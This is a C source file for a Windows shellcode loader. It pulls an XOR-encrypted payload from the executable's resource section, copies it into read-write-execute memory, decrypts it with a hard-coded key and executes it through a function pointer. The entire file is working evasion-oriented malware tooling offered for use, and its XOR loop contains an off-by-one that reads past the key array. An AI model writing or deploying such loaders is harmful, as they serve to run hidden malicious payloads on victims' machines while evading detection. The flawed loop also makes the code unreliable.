#include <Windows.h>
#include <stdio.h>
#include "resource.h"

// change the random bytes
unsigned char randomKey[] = {
0xAA, 0xBB, 0xCC, 0xDD, 0xEE
};

/*
	- pShellcode : Base address of the payload to encrypt
	- sShellcodeSize : The size of the payload
	- bKey : A random array of bytes of specific size
	- sKeySize : The size of the key
*/

VOID XorFunction(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j > sKeySize) {
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}


int main() {

	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;


	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA2*
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA2), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Printing pointer and size to the screen
	printf("[i] pPayloadAddress var : 0x%p \n", pPayloadAddress);

	// Allocating memory using a VirtualAlloc call
	PVOID pTmpBuffer = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pTmpBuffer != NULL) {
		// copying the payload from resource section to the new buffer 
		memcpy(pTmpBuffer, pPayloadAddress, sPayloadSize);
	}
	else {
		// Error handling
		printf("[!] VirtualAlloc failed with error : %d \n", GetLastError());
		return -1;
	}

	// Printing the base address of our buffer (pTmpBuffer)
	printf("[i] pTmpBuffer var : 0x%p \n", pTmpBuffer);

	printf("[!] Decrypting shellcode...\n");
	XorFunction(pTmpBuffer, sPayloadSize, randomKey, sizeof(randomKey));

	printf("[!] Shellcode successfully decrypted. Now executing shellcode..\n");

	// Declare a function pointer type that matches the shellcode signature
	typedef void (*ShellcodeFunction)();

	// Cast the executable buffer as a function pointer
	ShellcodeFunction shellcodeFunc = (ShellcodeFunction)pTmpBuffer;

	// Call the shellcode function
	shellcodeFunc();

	// Free the executable buffer
	VirtualFree(pTmpBuffer, 0, MEM_RELEASE);

	return 0;
}
